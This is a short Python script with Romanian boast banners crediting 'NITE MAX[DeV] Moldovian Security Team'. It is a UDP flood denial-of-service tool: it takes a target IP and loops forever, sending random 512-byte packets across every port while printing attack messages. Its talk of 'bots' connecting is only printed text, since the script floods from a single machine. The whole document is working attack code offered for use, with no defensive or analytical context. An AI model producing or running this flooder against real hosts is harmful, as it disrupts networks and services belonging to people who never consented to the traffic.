import sys
import time
import socket
import random

if len(sys.argv) < 2:
    print('Nai pus ip.')
    exit()

port = 1
ip = sys.argv[1]

print("ARHIVA FLOD FORTA-BRUTA BY NITE MAX[DeV] MOLDOVA")
print("MOLDOVIAN SECURITY TEAM TIRFO")
print("NU DA LEAK LA ARHIVA")
print("NITE MAX[DeV] PREGATESTE FLODU IN", ip)
print("NU DA LEAK LA ARHIVA")
print("SPUNETI RUGACIUNILE TIRFO BOTII LUI NITE MAX[DeV] SE CONECTEAZA")
time.sleep(5)
print("BOTII LUI NITE MAX[DeV] SAU CONECTAT TIRFO LMFAO =]]]]]]]]]]]]]]]]]]]]]]]]]]]]]")
print("MOLDOVA POWER")
time.sleep(3)
print("INCEPEM ATACU TIRFO SPUNETI RUGACIUNILE")
print("BOT1")
print("BOT2")
print("BOT3")
print("BOT4")
print("BOT5")
time.sleep(2)

flodPUTERNICK = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
fortaBRUTA = random._urandom(512)

while True:
    port += 1
    if port == 65535:
        port = 1
    flodPUTERNICK.sendto(fortaBRUTA, (ip,int(port)))
    print("NITE MAX[DeV] MOLDOVIAN SECURITY TEAM ATACA GRAV", ip, "PE PORT", port)